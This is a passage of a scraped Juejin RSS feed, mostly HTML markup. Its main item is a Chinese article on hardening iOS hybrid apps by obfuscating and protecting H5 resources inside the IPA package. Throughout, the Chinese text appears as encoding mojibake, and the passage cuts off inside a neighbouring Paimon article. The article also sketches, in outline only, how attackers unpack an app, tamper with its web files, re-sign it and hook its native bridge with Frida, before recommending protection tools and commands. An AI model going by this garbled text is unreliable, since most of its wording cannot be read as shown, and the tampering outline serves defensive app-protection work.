title="https://mp.weixin.qq.com/s?__biz=MzIwODYwNTA4MA==&amp;mid=2247486409&amp;idx=1&amp;sn=a934c815a81fec948c9e146223aab8f9&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">Spring AI Alibaba å’Œ AgentScope å•¥åŒºåˆ«ï¼Ÿ</a>ã€‹</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[H5 æ··åˆåº”ç”¨åŠ å¯† Web èµ„æºæš´éœ²åˆ° IPA å±‚é˜²æŠ¤çš„å®Œæ•´æŠ€æœ¯æ–¹æ¡ˆ]]></title>    <link>https://juejin.cn/post/7583912899388457003</link>    <guid>https://juejin.cn/post/7583912899388457003</guid>    <pubDate>2025-12-15T09:36:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583912899388457003" data-draft-id="7583727768544034852" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="H5 æ··åˆåº”ç”¨åŠ å¯† Web èµ„æºæš´éœ²åˆ° IPA å±‚é˜²æŠ¤çš„å®Œæ•´æŠ€æœ¯æ–¹æ¡ˆ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-15T09:36:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¼€å¿ƒå°±å¥½2025"/> <meta itemprop="url" content="https://juejin.cn/user/3850962908492660"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            H5 æ··åˆåº”ç”¨åŠ å¯† Web èµ„æºæš´éœ²åˆ° IPA å±‚é˜²æŠ¤çš„å®Œæ•´æŠ€æœ¯æ–¹æ¡ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3850962908492660/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¼€å¿ƒå°±å¥½2025
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T09:36:58.000Z" title="Mon Dec 15 2025 09:36:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨å¤§é‡ iOS é¡¹ç›®ä¸­ï¼Œ<strong>H5 æ··åˆåº”ç”¨ï¼ˆHybrid Appï¼‰</strong> å·²ç»æˆä¸ºå¸¸æ€ï¼š
ç™»å½•é¡µã€æ´»åŠ¨é¡µã€è¿è¥æ¨¡å—ã€é…ç½®ä¸­å¿ƒã€ç”šè‡³æ ¸å¿ƒä¸šåŠ¡æµç¨‹ï¼Œéƒ½é€šè¿‡ WebView + H5 æ‰¿è½½ã€‚</p>
<p>è¿™ç§æ¶æ„åœ¨æ•ˆç‡ä¸Šéå¸¸æˆåŠŸï¼Œä½†åœ¨å®‰å…¨å±‚é¢ä¹Ÿå¸¦æ¥äº†ä¸€ä¸ªé•¿æœŸè¢«ä½ä¼°çš„é—®é¢˜ï¼š</p>
<blockquote>
<p><strong>H5 èµ„æºå‡ ä¹æ˜¯â€œè£¸éœ²â€åœ¨ IPA ä¸­çš„ï¼Œä¸€æ—¦è¢«æ›¿æ¢ï¼Œåº”ç”¨è¡Œä¸ºå°±å¯èƒ½è¢«å½»åº•æ”¹å˜ã€‚</strong></p>
</blockquote>
<p>å› æ­¤ï¼Œâ€œH5 æ··åˆåº”ç”¨åŠ å¯†â€å¹¶ä¸æ˜¯å‰ç«¯å±‚é¢çš„ç®€å•æ··æ·†ï¼Œè€Œæ˜¯ä¸€ä¸ª<strong>è·¨è¶Šå‰ç«¯ã€åŸç”Ÿä¸ IPA æˆå“åŒ…çš„ç³»ç»Ÿæ€§å·¥ç¨‹é—®é¢˜</strong>ã€‚</p>
<p>æœ¬æ–‡ä» H5 æ··åˆåº”ç”¨çš„çœŸå®ç»“æ„å‡ºå‘ï¼Œåˆ†æå¸¸è§æ”»å‡»æ–¹å¼ï¼Œå¹¶ç»™å‡ºä¸€å¥—å¯è½åœ°ã€å¯è‡ªåŠ¨åŒ–çš„å¤šå·¥å…·ç»„åˆåŠ å¯†æ–¹æ¡ˆã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€ä»€ä¹ˆæ˜¯ H5 æ··åˆåº”ç”¨ï¼Ÿå®‰å…¨é—®é¢˜å‡ºåœ¨å“ªé‡Œ</h2>
<p>å…¸å‹çš„ H5 æ··åˆåº”ç”¨åŒ…å«ä»¥ä¸‹ç»„ä»¶ï¼š</p>
<ul>
<li>iOS åŸç”Ÿå£³ï¼ˆSwift / ObjCï¼‰</li>
<li>WebViewï¼ˆWKWebViewï¼‰</li>
<li>æœ¬åœ°æˆ–å†…åµŒ H5 èµ„æº</li>
<li>JSBridgeï¼ˆåŸç”Ÿä¸ JS é€šä¿¡ï¼‰</li>
<li>JSON / é…ç½®æ–‡ä»¶</li>
</ul>
<p>åœ¨ IPA è§£åŒ…åï¼Œå¸¸è§ç»“æ„å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">App.app/
 â”œâ”€ index.html
 â”œâ”€ js/
 â”‚   â”œâ”€ app.js
 â”‚   â”œâ”€ vendor.js
 â”œâ”€ css/
 â”œâ”€ config.json
 â”œâ”€ images/
 â””â”€ Frameworks/
</code></pre>
<p><strong>é—®é¢˜åœ¨äºï¼š</strong></p>
<ul>
<li>HTML / JS / JSON å…¨æ˜¯æ˜æ–‡</li>
<li>æ–‡ä»¶è·¯å¾„å›ºå®šã€æ˜“å®šä½</li>
<li>æ›¿æ¢æˆæœ¬æä½</li>
<li>ä¿®æ”¹åé‡ç­¾å³å¯è¿è¡Œ</li>
</ul>
<p>è¿™ä½¿å¾— H5 æ¨¡å—æˆä¸ºæ”»å‡»è€…æœ€ä¼˜å…ˆä¸‹æ‰‹çš„å¯¹è±¡ã€‚</p>
<hr/>
<h2 data-id="heading-1">äºŒã€æ”»å‡»è€…å¦‚ä½•ç ´è§£ H5 æ··åˆåº”ç”¨ï¼ˆå®é™…è·¯å¾„ï¼‰</h2>
<p>ä»å®æˆ˜è§’åº¦çœ‹ï¼Œæ”»å‡»æµç¨‹é«˜åº¦æ ‡å‡†åŒ–ï¼š</p>
<h3 data-id="heading-2">è§£å‹ IPA</h3>
<p>ç›´æ¥è·å–æ‰€æœ‰ H5 æ–‡ä»¶ã€‚</p>
<h3 data-id="heading-3">åˆ†æ H5 é€»è¾‘</h3>
<p>åŒ…æ‹¬ï¼š</p>
<ul>
<li>é¡µé¢è·³è½¬é€»è¾‘</li>
<li>æƒé™åˆ¤æ–­</li>
<li>æ”¯ä»˜æˆ–åŠŸèƒ½å¼€å…³</li>
<li>API å‚æ•°æ‹¼æ¥</li>
<li>JSBridge è°ƒç”¨</li>
</ul>
<h3 data-id="heading-4">ä¿®æ”¹æˆ–æ›¿æ¢æ–‡ä»¶</h3>
<p>ä¾‹å¦‚ï¼š</p>
<ul>
<li>åˆ é™¤æ ¡éªŒ</li>
<li>ç¯¡æ”¹è¿”å›å€¼</li>
<li>æ›¿æ¢æ•´ä¸ªæ´»åŠ¨é¡µ</li>
<li>æ³¨å…¥æ¶æ„è„šæœ¬</li>
</ul>
<h3 data-id="heading-5">é‡ç­¾ IPA å¹¶è¿è¡Œ</h3>
<p>åŸç”Ÿå£³å¾€å¾€æ— æ³•å¯Ÿè§‰èµ„æºå·²è¢«æ›¿æ¢ã€‚</p>
<p><strong>ç»“è®ºï¼š</strong>
å¦‚æœåªåšå‰ç«¯æ··æ·†ï¼Œè€Œä¸å¤„ç† IPA å±‚ç»“æ„ï¼ŒH5 æ··åˆåº”ç”¨å‡ ä¹æ— æ³•æŠµå¾¡ç ´è§£ã€‚</p>
<hr/>
<h2 data-id="heading-6">ä¸‰ã€H5 æ··åˆåº”ç”¨åŠ å¯†éœ€è¦è¦†ç›–å“ªäº›å±‚çº§</h2>
<p>ä»å·¥ç¨‹è§†è§’çœ‹ï¼Œä¸€ä¸ªå®Œæ•´çš„åŠ å¯†æ–¹æ¡ˆè‡³å°‘è¦è¦†ç›–å››ä¸ªå±‚é¢ï¼š</p>
<ol>
<li><strong>H5/JS å±‚ï¼šé™ä½å¯è¯»æ€§</strong></li>
<li><strong>èµ„æºå±‚ï¼šé˜²æ­¢ç›´æ¥æ›¿æ¢</strong></li>
<li><strong>åŸç”Ÿå±‚ï¼šä¿æŠ¤ JSBridge ä¸è°ƒç”¨å…³ç³»</strong></li>
<li><strong>IPA å±‚ï¼šé‡æ„æ•´ä½“ç»“æ„ï¼Œé˜»æ–­æ”»å‡»è·¯å¾„</strong></li>
</ol>
<p>åªåšå…¶ä¸­ä¸€å±‚ï¼Œæ•ˆæœéƒ½éå¸¸æœ‰é™ã€‚</p>
<hr/>
<h2 data-id="heading-7">å››ã€å„å±‚å¯ç”¨å·¥å…·ä¸èŒè´£åˆ’åˆ†</h2>
<h3 data-id="heading-8">â‘  H5 / JS å±‚å·¥å…·ï¼ˆåŸºç¡€å±‚ï¼‰</h3>
<p>å¸¸è§å·¥å…·ï¼š</p>
<ul>
<li>javascript-obfuscator</li>
<li>uglify / terser</li>
<li>webpack å‹ç¼©ä¸æ··æ·†æ’ä»¶</li>
</ul>
<p><strong>ä½œç”¨ï¼š</strong></p>
<ul>
<li>å‹ç¼©ä»£ç </li>
<li>æ··æ·†å˜é‡ä¸å‡½æ•°å</li>
<li>é™ä½å¯è¯»æ€§</li>
</ul>
<p><strong>å±€é™ï¼š</strong></p>
<ul>
<li>æ— æ³•é˜²æ­¢æ–‡ä»¶è¢«æ›¿æ¢</li>
<li>æ— æ³•é˜²æ­¢è·¯å¾„è¢«å®šä½</li>
<li>æ— æ³•é˜²æ­¢é‡ç­¾</li>
</ul>
<p>åªèƒ½ä½œä¸º<strong>ç¬¬ä¸€é“åŸºç¡€é˜²æŠ¤</strong>ã€‚</p>
<hr/>
<h3 data-id="heading-9">â‘¡ IPA å±‚èµ„æºä¿æŠ¤å·¥å…·ï¼ˆæ ¸å¿ƒå±‚ï¼‰</h3>
<p>è¿™æ˜¯ H5 æ··åˆåº”ç”¨åŠ å¯†ä¸­<strong>æœ€å…³é”®çš„ä¸€ç¯</strong>ã€‚</p>
<p>IPA å±‚å·¥å…·çš„èŒè´£æ˜¯ï¼š</p>
<ul>
<li>æ”¹å HTML / JS / CSS / JSON</li>
<li>æ‰°åŠ¨èµ„æºè·¯å¾„</li>
<li>ä¿®æ”¹èµ„æº MD5ï¼ˆé˜²æ­¢æ›¿æ¢ï¼‰</li>
<li>è®©åŸç”ŸåŠ è½½é€»è¾‘ä¸èµ„æºä¸€ä¸€ç»‘å®š</li>
<li>ä¸ä¾èµ–æºç </li>
</ul>
<p>åœ¨è¿™ä¸€å±‚ï¼Œ<strong>Ipa Guardï¼ˆæ”¯æŒå‘½ä»¤è¡Œï¼‰</strong> æ˜¯å…¸å‹å·¥å…·ä¹‹ä¸€ï¼Œå¸¸ç”¨äºå¯¹å·²ç”Ÿæˆçš„ IPA è¿›è¡Œç»Ÿä¸€å¤„ç†ã€‚</p>
<p>å®ƒçš„ç‰¹ç‚¹æ˜¯ï¼š</p>
<ul>
<li>ä¸éœ€è¦ iOS App æºç </li>
<li>ç›´æ¥ä½œç”¨äº IPA</li>
<li>æ”¯æŒæ··æ·† JSã€HTMLã€JSONã€å›¾ç‰‡</li>
<li>å¯ä¿®æ”¹èµ„æº MD5ï¼Œé˜»æ–­ç®€å•æ›¿æ¢</li>
<li>é€‚é… Hybrid / H5 / RN / Flutter åœºæ™¯</li>
<li>æ”¯æŒ CLIï¼Œé€‚åˆè‡ªåŠ¨åŒ–</li>
</ul>
<hr/>
<h3 data-id="heading-10">â‘¢ åŸç”Ÿå±‚ç¬¦å·ä¸æ¡¥æ¥ä¿æŠ¤</h3>
<p>H5 æ··åˆåº”ç”¨é«˜åº¦ä¾èµ– JSBridgeï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li>ç™»å½•å›è°ƒ</li>
<li>æ”¯ä»˜å›è°ƒ</li>
<li>æƒé™æŸ¥è¯¢</li>
<li>è®¾å¤‡ä¿¡æ¯</li>
</ul>
<p>å¦‚æœåŸç”Ÿç¬¦å·æš´éœ²ï¼š</p>
<ul>
<li>æ”»å‡»è€…å¯é€šè¿‡ Frida Hook Bridge</li>
<li>ä¼ªé€  JS è°ƒç”¨ç»“æœ</li>
</ul>
<p>å¯ç”¨å·¥å…·åŒ…æ‹¬ï¼š</p>
<ul>
<li>Swift Shieldï¼ˆæºç å±‚ï¼Œé€‚åˆçº¯ Swiftï¼‰</li>
<li>IPA å±‚ç¬¦å·æ··æ·†å·¥å…·ï¼ˆæ— éœ€æºç ï¼‰</li>
</ul>
<p>IPA å±‚æ··æ·†åœ¨æ— æºç æˆ–æ··åˆé¡¹ç›®ä¸­æ›´å…·ç°å®æ„ä¹‰ã€‚</p>
<hr/>
<h3 data-id="heading-11">â‘£ ç­¾åä¸å®Œæ•´æ€§éªŒè¯å·¥å…·</h3>
<p>ç”¨äºéªŒè¯åŠ å¯†åçš„ IPA æ˜¯å¦ç¨³å®šï¼š</p>
<ul>
<li>kxsignï¼šé‡ç­¾ã€å®‰è£…ã€æµ‹è¯•</li>
<li>å†…éƒ¨å®Œæ•´æ€§æ ¡éªŒé€»è¾‘ï¼ˆå¯é€‰ï¼‰</li>
</ul>
<hr/>
<h2 data-id="heading-12">äº”ã€H5 æ··åˆåº”ç”¨åŠ å¯†çš„æ ‡å‡† IPA çº§æµç¨‹</h2>
<p>ä¸‹é¢æ˜¯ä¸€å¥—å¯ç›´æ¥å¤ç”¨çš„å·¥ç¨‹æµç¨‹ã€‚</p>
<hr/>
<h3 data-id="heading-13">Step 1ï¼šè§£æ IPAï¼Œè¯†åˆ« H5 ä¸èµ„æºä¾èµ–</h3>
<pre><code class="hljs">ipaguard_cli parse app.ipa -o sym.json
</code></pre>
<p>è¿™ä¸€æ­¥å¯è·å¾—ï¼š</p>
<ul>
<li>H5 æ–‡ä»¶è·¯å¾„</li>
<li>JS / JSON æ–‡ä»¶åˆ—è¡¨</li>
<li>åŸç”Ÿç¬¦å·ä¸å¼•ç”¨å…³ç³»</li>
</ul>
<p>ä¸ºåç»­â€œå¯æ§åŠ å¯†â€æä¾›åŸºç¡€ã€‚</p>
<hr/>
<h3 data-id="heading-14">Step 2ï¼šåˆ¶å®šèµ„æºä¿æŠ¤ç­–ç•¥</h3>
<p>é€šå¸¸ä¼šåŒºåˆ†ï¼š</p>
<ul>
<li><strong>å¿…é¡»ä¿ç•™åç§°çš„æ–‡ä»¶</strong>ï¼ˆå…¥å£æ–‡ä»¶ã€ç‰¹æ®ŠåŠ è½½æ–‡ä»¶ï¼‰</li>
<li><strong>å¯æ”¹åçš„ JS / JSON / å›¾ç‰‡</strong></li>
<li><strong>éœ€è¦é‡ç‚¹ä¿æŠ¤çš„é…ç½®æ–‡ä»¶</strong></li>
<li><strong>æ¡¥æ¥ç›¸å…³ç¬¦å·ï¼ˆè°¨æ…å¤„ç†ï¼‰</strong></li>
</ul>
<hr/>
<h3 data-id="heading-15">Step 3ï¼šæ‰§è¡Œ IPA å±‚åŠ å¯†ä¸æ··æ·†</h3>
<pre><code class="hljs language-bash" lang="bash">ipaguard_cli protect app.ipa \
  -c sym.json \
  --js \
  --image \
  -o protected.ipa
</code></pre>
<p>æ‰§è¡Œç»“æœåŒ…æ‹¬ï¼š</p>
<ul>
<li>H5 / JS / JSON æ–‡ä»¶åè¢«æ”¹å†™</li>
<li>èµ„æºè·¯å¾„è¢«æ‰°åŠ¨</li>
<li>èµ„æº MD5 è¢«ä¿®æ”¹ï¼Œç›´æ¥æ›¿æ¢å¤±æ•ˆ</li>
<li>åŸç”Ÿç¬¦å·æ··æ·†ï¼Œé™ä½ Hook æˆåŠŸç‡</li>
</ul>
<hr/>
<h3 data-id="heading-16">Step 4ï¼šé‡ç­¾å¹¶çœŸæœºæµ‹è¯•</h3>
<pre><code class="hljs language-bash" lang="bash">kxsign sign protected.ipa \
  -c dev.p12 \
  -p password \
  -m dev.mobileprovision \
  -z signed.ipa -i
</code></pre>
<p>é‡ç‚¹éªŒè¯ï¼š</p>
<ul>
<li>é¡µé¢æ˜¯å¦æ­£å¸¸åŠ è½½</li>
<li>JSBridge æ˜¯å¦å¯ç”¨</li>
<li>H5 ä¸åŸç”Ÿé€šä¿¡æ˜¯å¦æ­£å¸¸</li>
<li>æ˜¯å¦å­˜åœ¨èµ„æºåŠ è½½å¼‚å¸¸</li>
</ul>
<hr/>
<h2 data-id="heading-17">å¦‚ä½•æŠŠ H5 åŠ å¯†å˜æˆé»˜è®¤æµç¨‹</h2>
<p>æˆç†Ÿå›¢é˜Ÿé€šå¸¸è¿™æ ·åšï¼š</p>
<ol>
<li>CI æ„å»ºç”Ÿæˆ IPA</li>
<li>è‡ªåŠ¨è§£æ IPA èµ„æº</li>
<li>æ‰§è¡Œ IPA å±‚ H5 åŠ å¯†</li>
<li>è‡ªåŠ¨é‡ç­¾</li>
<li>å†’çƒŸæµ‹è¯•</li>
<li>å½’æ¡£æ··æ·†ç­–ç•¥ä¸æ˜ å°„</li>
</ol>
<p>è¿™æ ·ï¼Œæ¯ä¸€ä¸ªç‰ˆæœ¬çš„ H5 éƒ½æ˜¯â€œé»˜è®¤åŠ å¯†â€çš„ï¼Œè€Œä¸æ˜¯ä¸´æ—¶å¤„ç†ã€‚</p>
<hr/>
<h2 data-id="heading-18">H5 æ··åˆåº”ç”¨åŠ å¯†çš„æ ¸å¿ƒç»“è®º</h2>
<p>ä»å·¥ç¨‹è§’åº¦æ€»ç»“ï¼š</p>
<ul>
<li><strong>H5 å®‰å…¨ä¸èƒ½åªé å‰ç«¯æ··æ·†</strong></li>
<li><strong>IPA å±‚èµ„æºåŠ å¯†æ˜¯å…³é”®æ‰‹æ®µ</strong></li>
<li><strong>ä¸ä¾èµ–æºç çš„æ–¹æ¡ˆæ›´é€‚åˆå®é™…é¡¹ç›®</strong></li>
<li><strong>å¤šå·¥å…·åˆ†å·¥åä½œæ‰æ˜¯å¯æŒç»­æ–¹æ¡ˆ</strong></li>
</ul>
<p>åœ¨å½“å‰ç§»åŠ¨å®‰å…¨å®è·µä¸­ï¼Œ<strong>IPA å±‚çš„ H5 åŠ å¯†å·²ç»æˆä¸ºæ··åˆåº”ç”¨çš„åŸºç¡€èƒ½åŠ›ï¼Œè€Œä¸æ˜¯é«˜çº§é€‰é¡¹</strong>ã€‚</p>
<hr/>
<h3 data-id="heading-19">æ¨èçš„å·¥å…·åˆ†å·¥ç»“æ„</h3>





























<table><thead><tr><th>å±‚çº§</th><th>å·¥å…·</th></tr></thead><tbody><tr><td>H5 å±‚</td><td>JS æ··æ·† / æ„å»ºå‹ç¼©</td></tr><tr><td>IPA èµ„æºå±‚</td><td>Ipa Guard CLI</td></tr><tr><td>åŸç”Ÿç¬¦å·å±‚</td><td>Swift Shield / IPA å±‚æ··æ·†</td></tr><tr><td>ç­¾åéªŒè¯</td><td>kxsign</td></tr><tr><td>é€†å‘éªŒè¯</td><td>Hopper / Frida</td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Paimonæºç è§£è¯» -- Compaction-8.ä¸“ç”¨å‹ç¼©ä»»åŠ¡]]></title>    <link>https://juejin.cn/post/7583696325142904870</link>    <guid>https://juejin.cn/post/7583696325142904870</guid>    <pubDate>2025-12-15T09:30:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583696325142904870" data-draft-id="7583618094175453230" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Paimonæºç è§£è¯» -- Compaction-8.ä¸“ç”¨å‹ç¼©ä»»åŠ¡"/> <meta itemprop="keywords" content="åç«¯,å¤§æ•°æ®,Flink"/> <meta itemprop="datePublished" content="2025-12-15T09:30:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="expect7g"/> <meta itemprop="url" content="https://juejin.cn/user/3514471387235735"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Paimonæºç è§£è¯» -- Compaction-8.ä¸“ç”¨å‹ç¼©ä»»åŠ¡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3514471387235735/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    expect7g
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T09:30:47.000Z" title="Mon Dec 15 2025 09:30:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body 